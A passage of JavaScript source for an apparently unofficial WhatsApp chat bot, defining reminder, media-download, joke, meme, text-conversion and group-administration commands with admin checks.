      pack: "WhatsApp Sticker"
    }, { quoted: context.ms });
    
  } catch (error) {
    console.error("Error in sticker command:", error);
    await repondre("❌ An error occurred while creating the sticker.");
  }
});

hango({
  nomCom: "reminder",
  aliases: ["remind", "remindme"],
  desc: "Set a reminder",
  categorie: "utility",
  reaction: '⏰',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    if (arg.length < 2) {
      return repondre(`
❌ Please specify time and reminder text.

📝 *Usage:*
.reminder 5m Call mom
.reminder 2h Meeting with client
.reminder 1d Birthday party

*Time units:* s (seconds), m (minutes), h (hours), d (days)
      `);
    }
    
    // Parse time
    const timeArg = arg[0].toLowerCase();
    const reminderText = arg.slice(1).join(" ");
    
    // Extract number and unit
    const match = timeArg.match(/^(\d+)([smhd])$/);
    
    if (!match) {
      return repondre("❌ Invalid time format. Use format like: 5m, 2h, 1d");
    }
    
    const timeValue = parseInt(match[1]);
    const timeUnit = match[2];
    
    // Convert to milliseconds
    let timeMs = 0;
    switch (timeUnit) {
      case 's': timeMs = timeValue * 1000; break;
      case 'm': timeMs = timeValue * 60 * 1000; break;
      case 'h': timeMs = timeValue * 60 * 60 * 1000; break;
      case 'd': timeMs = timeValue * 24 * 60 * 60 * 1000; break;
    }
    
    // Confirm reminder set
    await repondre(`⏰ Reminder set for ${timeArg} from now.`);
    
    // Set timeout for reminder
    setTimeout(async () => {
      await hn.sendMessage(dest.chat, {
        text: `⏰ *REMINDER*\n\n${reminderText}\n\n_Reminder set ${timeArg} ago_`,
        mentions: [dest.sender]
      });
    }, timeMs);
    
  } catch (error) {
    console.error("Error in reminder command:", error);
    await repondre("❌ An error occurred while setting the reminder.");
  }
});

// AI and media commands

hango({
  nomCom: "ytmp3",
  aliases: ["mp3", "ytaudio"],
  desc: "Download YouTube audio",
  categorie: "media",
  reaction: '🎵',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const url = arg[0];
    
    if (!url) {
      return repondre("❌ Please provide a YouTube video URL.");
    }
    
    if (!url.match(/^(https?:\/\/)?(www\.)?(youtube\.com|youtu\.be)/)) {
      return repondre("❌ Please provide a valid YouTube URL.");
    }
    
    await repondre("⏳ Processing your request. This may take a moment...");
    
    // Use a YouTube download service API
    const ytDlUrl = `https://loader.to/api/button/?url=${encodeURIComponent(url)}&f=mp3`;
    
    // Get video info
    const info = await ytdl.getInfo(url);
    const videoTitle = info.videoDetails.title;
    const thumbnail = info.videoDetails.thumbnails[0].url;
    
    // Send audio with thumbnail
    await hn.sendMessage(dest.chat, {
      audio: { url: ytDlUrl },
      mimetype: 'audio/mpeg',
      fileName: `${videoTitle}.mp3`,
      contextInfo: {
        externalAdReply: {
          title: videoTitle,
          body: "YouTube MP3",
          thumbnailUrl: thumbnail,
          sourceUrl: url
        }
      }
    });
    
  } catch (error) {
    console.error("Error in ytmp3 command:", error);
    await repondre("❌ An error occurred while downloading the audio.");
  }
});

hango({
  nomCom: "quote",
  aliases: ["quotegen", "inspire"],
  desc: "Get an inspirational quote",
  categorie: "fun",
  reaction: '💭',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Call API to get a random quote
    const response = await axios.get('https://api.quotable.io/random');
    const { content, author } = response.data;
    
    await repondre(`💭 *"${content}"*\n\n— *${author}*`);
  } catch (error) {
    console.error("Error in quote command:", error);
    await repondre("❌ An error occurred while fetching a quote.");
  }
});

hango({
  nomCom: "joke",
  aliases: ["telljoke", "funny"],
  desc: "Get a random joke",
  categorie: "fun",
  reaction: '😂',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Here we would normally fetch from an API
    // This is a simulation with a few hardcoded jokes
    const jokes = [
      "Why don't scientists trust atoms? Because they make up everything!",
      "What's the best thing about Switzerland? I don't know, but the flag is a big plus.",
      "Did you hear about the mathematician who's afraid of negative numbers? He'll stop at nothing to avoid them.",
      "Why was the math book sad? Because it had too many problems.",
      "I told my wife she was drawing her eyebrows too high. She looked surprised.",
      "What do you call a fake noodle? An impasta!",
      "Why did the scarecrow win an award? Because he was outstanding in his field!",
      "I'm reading a book about anti-gravity. It's impossible to put down!",
      "I used to be a baker, but I couldn't make enough dough.",
      "Why don't eggs tell jokes? They'd crack each other up."
    ];
    
    const randomJoke = jokes[Math.floor(Math.random() * jokes.length)];
    await repondre(`😂 *JOKE TIME*\n\n${randomJoke}`);
  } catch (error) {
    console.error("Error in joke command:", error);
    repondre("❌ Failed to tell a joke. My sense of humor crashed.");
  }
});

hango({
  nomCom: "antilink",
  aliases: ["nolinks", "disablelinks"],
  desc: "Toggle anti-link feature in the group",
  categorie: "group",
  reaction: '🔗',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Toggle antilink mode
    const status = arg[0]?.toLowerCase();
    
    if (!status || !['on', 'off'].includes(status)) {
      return repondre("❌ Please specify whether to turn antilink on or off. Example: .antilink on");
    }
    
    // In a full implementation, you would save this setting to a database
    // This is a placeholder implementation
    if (status === 'on') {
      // Enable antilink
      repondre("✅ Anti-link feature has been *enabled*. Links sent by non-admins will be deleted.");
    } else {
      // Disable antilink
      repondre("✅ Anti-link feature has been *disabled*. Members can now send links.");
    }
  } catch (error) {
    console.error("Error in antilink command:", error);
    repondre("❌ An error occurred while toggling the anti-link feature.");
  }
});

hango({
  nomCom: "warn",
  aliases: ["warning", "warnuser"],
  desc: "Warn a group member",
  categorie: "group",
  reaction: '⚠️',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if a member is tagged
    if (!dest.quoted) {
      return repondre("❌ Tag a member to warn by replying to their message.");
    }
    
    const targetId = dest.quoted.sender;
    
    // Check if target is the bot
    if (targetId === hn.user.id) {
      return repondre("❌ I cannot warn myself.");
    }
    
    // Check if target is an admin
    const isTargetAdmin = groupMetadata.participants.find(p => p.id === targetId && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (isTargetAdmin) {
      return repondre("❌ Cannot warn an admin.");
    }
    
    // In a full implementation, you would track warnings in a database
    // This is a placeholder implementation
    await repondre(`⚠️ @${targetId.split('@')[0]} has been *warned*.\nFurther violations may result in removal from the group.`, {
      mentions: [targetId]
    });
  } catch (error) {
    console.error("Error in warn command:", error);
    repondre("❌ An error occurred while warning the member.");
  }
});

hango({
  nomCom: "revoke",
  aliases: ["resetlink", "newlink"],
  desc: "Revoke the group invite link",
  categorie: "group",
  reaction: '🔄',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Revoke the group link
    await hn.groupRevokeInvite(dest.chat);
    
    repondre("✅ Group invite link has been revoked. Use .grouplink to get the new link.");
  } catch (error) {
    console.error("Error in revoke command:", error);
    repondre("❌ An error occurred while revoking the group link.");
  }
});

hango({
  nomCom: "grouplink",
  aliases: ["getlink", "invitelink"],
  desc: "Get the group invite link",
  categorie: "group",
  reaction: '🔗',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Get the group invite link
    const code = await hn.groupInviteCode(dest.chat);
    const link = `https://chat.whatsapp.com/${code}`;
    
    repondre(`🔗 *Group Invite Link*\n\n${link}`);
  } catch (error) {
    console.error("Error in grouplink command:", error);
    repondre("❌ An error occurred while getting the group link.");
  }
});

hango({
  nomCom: "antibot",
  aliases: ["nobot", "antibots"],
  desc: "Toggle anti-bot feature in the group",
  categorie: "group",
  reaction: '🤖',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Toggle antibot mode
    const status = arg[0]?.toLowerCase();
    
    if (!status || !['on', 'off'].includes(status)) {
      return repondre("❌ Please specify whether to turn antibot on or off. Example: .antibot on");
    }
    
    // In a full implementation, you would save this setting to a database
    // This is a placeholder implementation
    if (status === 'on') {
      // Enable antibot
      repondre("✅ Anti-bot feature has been *enabled*. Other bots will be removed when detected.");
    } else {
      // Disable antibot
      repondre("✅ Anti-bot feature has been *disabled*. Other bots are now allowed.");
    }
  } catch (error) {
    console.error("Error in antibot command:", error);
    repondre("❌ An error occurred while toggling the anti-bot feature.");
  }
});

hango({
  nomCom: "mute",
  aliases: ["mutegroup", "silence"],
  desc: "Mute the group for non-admins",
  categorie: "group",
  reaction: '🔇',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Set group to admins-only mode
    await hn.groupSettingUpdate(dest.chat, 'announcement');
    
    repondre("🔇 Group has been *muted*. Only admins can send messages now.");
  } catch (error) {
    console.error("Error in mute command:", error);
    repondre("❌ An error occurred while muting the group.");
  }
});

hango({
  nomCom: "unmute",
  aliases: ["unmutegroup", "unsilence"],
  desc: "Unmute the group for all members",
  categorie: "group",
  reaction: '🔊',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Set group to everyone mode
    await hn.groupSettingUpdate(dest.chat, 'not_announcement');
    
    repondre("🔊 Group has been *unmuted*. All members can send messages now.");
  } catch (error) {
    console.error("Error in unmute command:", error);
    repondre("❌ An error occurred while unmuting the group.");
  }
});

hango({
  nomCom: "admins",
  aliases: ["adminlist", "listadmins"],
  desc: "List all admins in the group",
  categorie: "group",
  reaction: '👑',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Get group metadata
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const admins = groupMetadata.participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin');
    
    if (admins.length === 0) {
      return repondre("❓ Strange, no admins found in this group.");
    }
    
    // Create admin list with mentions
    let message = `👑 *ADMIN LIST*\n\n`;
    
    admins.forEach((admin, i) => {
      message += `${i + 1}. @${admin.id.split('@')[0]}\n`;
    });
    
    const mentions = admins.map(a => a.id);
    
    await hn.sendMessage(dest.chat, {
      text: message,
      mentions: mentions
    });
  } catch (error) {
    console.error("Error in admins command:", error);
    repondre("❌ An error occurred while listing the admins.");
  }
});

hango({
  nomCom: "add",
  aliases: ["invite", "addmember"],
  desc: "Add a person to the group",
  categorie: "group",
  reaction: '➕',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if number is provided
    if (arg.length === 0) {
      return repondre("❌ Please provide the phone number to add. Example: .add 1234567890");
    }
    
    let number = arg[0].replace(/[^0-9]/g, '');
    
    // Add country code if not present
    if (number.length <= 11) {
      number = '91' + number; // Assuming 91 for India, modify for your region
    }
    
    // Ensure number has @ format
    if (!number.includes('@')) {
      number = number + '@s.whatsapp.net';
    }
    
    // Add the member
    const response = await hn.groupParticipantsUpdate(dest.chat, [number], "add");
    
    if (response[0].status === "409") {
      return repondre("❌ The person is already in the group.");
    } else if (response[0].status === "403") {
      return repondre("❌ Failed to add. The person might have their privacy settings restricted.");
    } else if (response[0].status === "408") {
      return repondre("❌ Failed to add. The person might have left the group recently.");
    } else if (response[0].status === "200") {
      return repondre("✅ Successfully added to the group!");
    } else {
      return repondre("❌ Failed to add the person. Status: " + response[0].status);
    }
  } catch (error) {
    console.error("Error in add command:", error);
    repondre("❌ An error occurred while adding the member.");
  }
});

hango({
  nomCom: "groupdp",
  aliases: ["setdp", "groupicon"],
  desc: "Change the group profile picture",
  categorie: "group",
  reaction: '🖼️',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if an image is quoted
    if (!dest.quoted || !dest.quoted.image) {
      return repondre("❌ Please reply to an image to set as group icon.");
    }
    
    // Download the image
    const media = await dest.quoted.download();
    
    // Set as group icon
    await hn.updateProfilePicture(dest.chat, media);
    
    repondre("✅ Group icon has been updated successfully!");
  } catch (error) {
    console.error("Error in groupdp command:", error);
    repondre("❌ An error occurred while changing the group icon.");
  }
});

hango({
  nomCom: "hidetag",
  aliases: ["htag", "secretmention"],
  desc: "Mention everyone without showing tag list",
  categorie: "group",
  reaction: '👥',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Get message to announce (if any)
    const message = arg.join(" ") || "Important announcement!";
    
    // Get all members for mentions
    const mentions = groupMetadata.participants.map(p => p.id);
    
    // Send message with hidden tags
    await hn.sendMessage(dest.chat, {
      text: message,
      mentions: mentions
    });
  } catch (error) {
    console.error("Error in hidetag command:", error);
    repondre("❌ An error occurred while sending the hidden tag message.");
  }
});

hango({
  nomCom: "leave",
  aliases: ["leavegroup", "botleave"],
  desc: "Make the bot leave the group",
  categorie: "group",
  reaction: '👋',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin or bot owner
    const isOwner = dest.sender === conf.owner;
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin && !isOwner) {
      return repondre("❌ Only group admins or the bot owner can use this command.");
    }
    
    // Send goodbye message
    await repondre("👋 It was nice being here. Goodbye everyone!");
    
    // Leave the group after a short delay
    setTimeout(async () => {
      await hn.groupLeave(dest.chat);
    }, 1000);
  } catch (error) {
    console.error("Error in leave command:", error);
    repondre("❌ An error occurred while leaving the group.");
  }
});

hango({
  nomCom: "announce",
  aliases: ["announcement", "broadcast"],
  desc: "Send a formatted announcement to the group",
  categorie: "group",
  reaction: '📢',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if announcement text is provided
    if (arg.length === 0) {
      return repondre("❌ Please provide the announcement text.");
    }
    
    const announcement = arg.join(" ");
    
    // Format the announcement
    const formattedAnnouncement = `
━━━━━━━━━━━━━━━
📢 *GROUP ANNOUNCEMENT*
━━━━━━━━━━━━━━━

${announcement}

━━━━━━━━━━━━━━━
From: @${dest.sender.split('@')[0]}
Date: ${new Date().toLocaleDateString()}
Time: ${new Date().toLocaleTimeString()}
━━━━━━━━━━━━━━━
    `;
    
    // Send announcement
    await hn.sendMessage(dest.chat, {
      text: formattedAnnouncement,
      mentions: [dest.sender]
    });
  } catch (error) {
    console.error("Error in announce command:", error);
    repondre("❌ An error occurred while sending the announcement.");
  }
});

hango({
  nomCom: "meme",
  aliases: ["randommeme", "funmeme"],
  desc: "Get a random meme from Reddit",
  categorie: "fun",
  reaction: '😂',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Fetch random meme from Reddit
    const response = await axios.get('https://meme-api.com/gimme');
    const { url, title, subreddit } = response.data;
    
    // Send the meme with caption
    await hn.sendMessage(dest.chat, {
      image: { url: url },
      caption: `😂 *${title}*\n\nSource: r/${subreddit}`
    });
  } catch (error) {
    console.error("Error in meme command:", error);
    await repondre("❌ An error occurred while fetching a meme.");
  }
});

hango({
  nomCom: "ascii",
  aliases: ["asciiart", "textart"],
  desc: "Convert text to ASCII art",
  categorie: "fun",
  reaction: '🎨',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to ASCII art.");
    }
    
    // Use figlet API for ASCII art conversion
    const response = await axios.get(`https://api.xteam.xyz/figlet?text=${encodeURIComponent(text)}`);
    const asciiArt = response.data.result;
    
    // Send ASCII art as monospace text
    await repondre("```" + asciiArt + "```");
  } catch (error) {
    console.error("Error in ascii command:", error);
    await repondre("❌ An error occurred while creating ASCII art. Try a shorter text.");
  }
});

hango({
  nomCom: "reverse",
  aliases: ["reversetext", "backward"],
  desc: "Reverse the given text",
  categorie: "fun",
  reaction: '🔄',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to reverse.");
    }
    
    // Reverse the text
    const reversedText = text.split("").reverse().join("");
    
    await repondre(`🔄 *Original:* ${text}\n\n*Reversed:* ${reversedText}`);
  } catch (error) {
    console.error("Error in reverse command:", error);
    await repondre("❌ An error occurred while reversing the text.");
  }
});

hango({
  nomCom: "zalgo",
  aliases: ["creepytext", "corrupted"],
  desc: "Convert text to zalgo (glitchy) format",
  categorie: "fun",
  reaction: '👹',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to zalgo format.");
    }
    
    // Function to add zalgo characters
    const zalgoify = (text) => {
      const zalgoMarks = [
        '\u0300', '\u0301', '\u0302', '\u0303', '\u0304', '\u0305',
        '\u0306', '\u0307', '\u0308', '\u0309', '\u030A', '\u030B',
        '\u030C', '\u030D', '\u030E', '\u030F', '\u0310', '\u0311'
      ];
      
      let result = '';
      for (const char of text) {
        result += char;
        // Add 2-5 random zalgo marks to each character
        const numMarks = Math.floor(Math.random() * 4) + 2;
        for (let i = 0; i < numMarks; i++) {
          const markIndex = Math.floor(Math.random() * zalgoMarks.length);
          result += zalgoMarks[markIndex];
        }
      }
      return result;
    };
    
    const zalgoText = zalgoify(text);
    
    await repondre(`👹 *Z̷͏a̷͏l̷͏g̷͏o̷͏ Text:*\n\n${zalgoText}`);
  } catch (error) {
    console.error("Error in zalgo command:", error);
    await repondre("❌ An error occurred while creating zalgo text.");
  }
});

hango({
  nomCom: "mock",
  aliases: ["mocktext", "sarcasm"],
  desc: "Convert text to mOcKiNg SpOnGeBoB format",
  categorie: "fun",
  reaction: '🥴',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to mocking format.");
    }
    
    // Convert to mocking text (alternating caps)
    let mockText = '';
    for (let i = 0; i < text.length; i++) {
      mockText += i % 2 === 0 ? text[i].toLowerCase() : text[i].toUpperCase();
    }
    
    await repondre(`🥴 *MoCkInG TeXt:*\n\n${mockText}`);
  } catch (error) {
    console.error("Error in mock command:", error);
    await repondre("❌ An error occurred while creating mocking text.");
  }
});

hango({
  nomCom: "hex",
  aliases: ["tohex", "hexconvert"],
  desc: "Convert text to hexadecimal",
  categorie: "conversion",
  reaction: '🔣',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to hexadecimal.");
    }
    
    // Convert text to hex
    const hexText = Buffer.from(text).toString('hex');
    
    await repondre(`🔣 *Hexadecimal:*\n\n${hexText}`);
  } catch (error) {
    console.error("Error in hex command:", error);
    await repondre("❌ An error occurred while converting to hexadecimal.");
  }
});

hango({
  nomCom: "unhex",
  aliases: ["fromhex", "hexdecode"],
  desc: "Convert hexadecimal to text",
  categorie: "conversion",
  reaction: '🔤',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const hex = arg.join(" ");
    
    if (!hex) {
      return repondre("❌ Please provide hexadecimal to convert to text.");
    }
    
    if (!/^[0-9A-Fa-f]+$/.test(hex)) {
      return repondre("❌ Invalid hexadecimal. Please provide valid hex characters (0-9, A-F).");
    }
    
    // Convert hex to text
    const text = Buffer.from(hex, 'hex').toString('utf-8');
    
    await repondre(`🔤 *Decoded Text:*\n\n${text}`);
  } catch (error) {
    console.error("Error in unhex command:", error);
    await repondre("❌ An error occurred while converting from hexadecimal.");
  }
});

hango({
  nomCom: "morse",
  aliases: ["tomorse", "morsecode"],
  desc: "Convert text to Morse code",
  categorie: "conversion",
  reaction: '📶',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("🖕 WHERE'S THE TEXT, YOU NOOB?");
    }
    
    // Morse code mapping
    const morseMap = {
      'a': '.-', 'b': '-...', 'c': '-.-.', 'd': '-..', 'e': '.', 'f': '..-.', 'g': '--.', 'h': '....',
      'i': '..', 'j': '.---', 'k': '-.-', 'l': '.-..', 'm': '--', 'n': '-.', 'o': '---', 'p': '.--.',
      'q': '--.-', 'r': '.-.', 's': '...', 't': '-', 'u': '..-', 'v': '...-', 'w': '.--', 'x': '-..-',
      'y': '-.--', 'z': '--..',
      '0': '-----', '1': '.----', '2': '..---', '3': '...--', '4': '....-', '5': '.....',
      '6': '-....', '7': '--...', '8': '---..', '9': '----.',
      '.': '.-.-.-', ',': '--..--', '?': '..--..', "'": '.----.', '!': '-.-.--', '/': '-..-.',
      '(': '-.--.', ')': '-.--.-', '&': '.-...', ':': '---...', ';': '-.-.-.', '=': '-...-',
      '+': '.-.-.', '-': '-....-', '_': '..--.-', '"': '.-..-.', '$': '...-..-', '@': '.--.-.',
      ' ': '/'
    };
    
    // Convert to Morse code
    const morseText = text.toLowerCase().split('').map(char => morseMap[char] || char).join(' ');
    
    await repondre(`📶 *Morse Code:*\n\n${morseText}`);
  } catch (error) {
    console.error("Error in morse command:", error);
    await repondre(`💀 CONVERSION FAILED! Error: ${error.message}\nText is resisting!`);
  }
});

hango({
  nomCom: "unmorse",
  aliases: ["frommorse", "morsedecode"],
  desc: "Convert Morse code to text",
  categorie: "conversion",
  reaction: '🔤',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const morse = arg.join(" ");
    
    if (!morse) {
      return repondre("🖕 WHERE'S THE MORSE CODE, YOU NOOB?");
    }
    
    // Reverse Morse code mapping
    const reverseMorseMap = {
      '.-': 'a', '-...': 'b', '-.-.': 'c', '-..': 'd', '.': 'e', '..-.': 'f', '--.': 'g', '....': 'h',
      '..': 'i', '.---': 'j', '-.-': 'k', '.-..': 'l', '--': 'm', '-.': 'n', '---': 'o', '.--.': 'p',
      '--.-': 'q', '.-.': 'r', '...': 's', '-': 't', '..-': 'u', '...-': 'v', '.--': 'w', '-..-': 'x',
      '-.--': 'y', '--..': 'z',
      '-----': '0', '.----': '1', '..---': '2', '...--': '3', '....-': '4', '.....': '5',
      '-....': '6', '--...': '7', '---..': '8', '----.': '9',
      '.-.-.-': '.', '--..--': ',', '..--..': '?', '.----.': "'", '-.-.--': '!', '-..-.': '/',
      '-.--.': '(', '-.--.-': ')', '.-...': '&', '---...': ':', '-.-.-.': ';', '-...-': '=',
      '.-.-.': '+', '-....-': '-', '..--.-': '_', '.-..-.': '"', '...-..-': '$', '.--.-.': '@',
      '/': ' '
    };
    
    // Convert from Morse code
    const text = morse.split(' ').map(code => reverseMorseMap[code] || code).join('');
    
    await repondre(`🔤 *Decoded Text:*\n\n${text}`);
  } catch (error) {
    console.error("Error in unmorse command:", error);
    await repondre(`💀 CONVERSION FAILED! Error: ${error.message}\nMorse code is resisting!`);
  }
});

hango({
  nomCom: "fancy",
  aliases: ["fancytext", "styler"],
  desc: "Convert text to various fancy styles",
  categorie: "fun",
  reaction: '✨',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    if (!arg.length) {
      return repondre(`
🖕 WHERE'S THE TEXT, YOU NOOB?

📝 *Usage:*
• .fancy Hello World (Shows all styles)
• .fancy 2 Hello World (Uses style #2)

*Available Styles:*
1. 𝓢𝓬𝓻𝓲𝓹𝓽
2. 𝔊𝔬𝔱𝔥𝔦𝔠
3. 𝕆𝕦𝕥𝕝𝕚𝕟𝕖𝕕
4. 𝚝𝚢𝚙𝚎𝚠𝚛𝚒𝚝𝚎𝚛
5. 𝐒𝐞𝐫𝐢𝐟 𝐁𝐨𝐥𝐝
6. 𝗦𝗮𝗻𝘀 𝗕𝗼𝗹𝗱
7. 𝘐𝘵𝘢𝘭𝘪𝘤
8. 𝙄𝙩𝙖𝙡𝙞𝙘 𝘽𝙤𝙡𝙙
9. Ⓑⓤⓑⓔⓛⓔⓢ
10. U͟n͟d͟e͟r͟l͟i͟n͟e͟d͟`);
    }
    
    // Check if first argument is a style number
    const firstArg = arg[0];
    const styleNum = parseInt(firstArg);
    let text;
    let useNumberedStyle = false;
    
    if (!isNaN(styleNum) && styleNum >= 1 && styleNum <= 10) {
      text = arg.slice(1).join(" ");
      useNumberedStyle = true;
      
      if (!text) {
        return repondre("🖕 WHERE'S THE TEXT, YOU NOOB?");
      }
    } else {
      text = arg.join(" ");
    }
    
    if (useNumberedStyle) {
      // Convert using numbered style
      let result = "";
      
      switch (styleNum) {
        case 1: // Script
          result = convertToUnicode(text, 0x1D4B6, 0x1D4D0);
          break;
        case 2: // Gothic
          result = convertToUnicode(text, 0x1D51E, 0x1D538);
          break;
        case 3: // Outlined
          result = convertToUnicode(text, 0x1D552, 0x1D56C);
          break;
        case 4: // Typewriter
          result = convertToUnicode(text, 0x1D68A, 0x1D6A4);
          break;
        case 5: // Serif Bold
          result = convertToUnicode(text, 0x1D41A, 0x1D434);
          break;
        case 6: // Sans Bold
          result = convertToUnicode(text, 0x1D5EE, 0x1D608);
          break;
        case 7: // Italic
          result = convertToUnicode(text, 0x1D482, 0x1D49C);
          break;
        case 8: // Italic Bold
          result = convertToUnicode(text, 0x1D482, 0x1D49C);
          break;
        case 9: // Bubbles
          result = text.split("").map(char => {
            const code = char.charCodeAt(0);
            if (code >= 97 && code <= 122) return String.fromCharCode(code - 97 + 0x24D0);
            if (code >= 65 && code <= 90) return String.fromCharCode(code - 65 + 0x24B6);
            if (code >= 48 && code <= 57) return String.fromCharCode(code - 48 + 0x2460);
            return char;
          }).join("");
          break;
        case 10: // Underlined
          result = text.split("").map(char => char + "\u0332").join("");
          break;
      }
      
      await repondre(`
✨ *FANCY TEXT*

*Original:* ${text}
*Style ${styleNum}:* ${result}
      `);
    } else {
      // Show all styles
      const styles = [
        { name: "Double Struck", value: convertToUnicode(text, 0x1D552, 0x1D56C) },
        { name: "Medieval", value: convertToUnicode(text, 0x1D51E, 0x1D538) },
        { name: "Cursive", value: convertToUnicode(text, 0x1D4B6, 0x1D4D0) },
        { name: "Bold", value: convertToUnicode(text, 0x1D5EE, 0x1D608) },
